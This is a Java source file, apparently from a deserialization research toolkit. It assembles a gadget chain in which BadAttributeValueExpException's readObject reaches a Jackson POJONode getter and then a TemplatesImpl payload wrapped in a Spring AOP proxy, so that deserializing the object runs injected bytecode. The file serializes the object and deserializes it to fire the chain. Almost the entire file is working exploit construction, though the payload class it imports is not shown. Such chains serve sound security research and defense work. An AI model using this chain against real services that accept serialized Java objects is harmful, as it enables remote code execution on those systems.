package org.example.gadget;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.Map;
import java.util.Vector;


import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.example.gadget.TemplateImplWithAbstractTranslet;
import org.example.gadget.TemplateImplWithoutAbstractTranslet;

import static org.example.CommonUtils.*;

// BadAttributeValueExpException#readObject -> getter
public class BAVE2Jackson2Tpl {
    public static void main(String[] args) throws Exception{

        TemplatesImpl tpl1 = TemplateImplWithoutAbstractTranslet.getPayload(null);

        rmJacksonWriteReplace();
        POJONode pojoNode = new POJONode(getJdkDynamicAopProxy(tpl1));
        BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
        setFieldValue(bave, "val", pojoNode);

        byte[] bytes;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream coos = new ObjectOutputStream(baos);
        coos.writeObject(bave);
        bytes = baos.toByteArray();
        unserialize(bytes);



    }

}